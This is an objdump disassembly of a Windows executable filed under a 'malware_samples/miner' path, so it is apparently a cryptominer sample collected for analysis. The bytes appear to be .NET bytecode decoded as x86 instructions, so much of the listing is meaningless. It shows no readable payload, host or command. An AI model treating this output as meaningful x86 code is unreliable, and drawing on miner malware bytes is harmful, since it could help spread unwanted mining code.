
malware_samples/miner/c59f9da72a678a7a5ec8ded96f868f1773567cdf0d2cf4b64c1f354d4cc66af4.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	20 c7                	and    %al,%bh
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 fc                	add    %bh,%ah
  402015:	6c                   	insb   (%dx),%es:(%edi)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	ae                   	scas   %es:(%edi),%al
  4021d0:	25 00 70 7e 10       	and    $0x107e7000,%eax
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 28                	add    $0x28,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 62 21 00       	and    $0x216272,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 5a                	jb     0x402250
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 62 21 00       	and    $0x216272,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 6c                	jb     0x402292
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 6c 26 00       	and    $0x266c72,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 67             	add    %dh,0x67(%edx)
  4024e4:	03 00                	add    (%eax),%eax
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
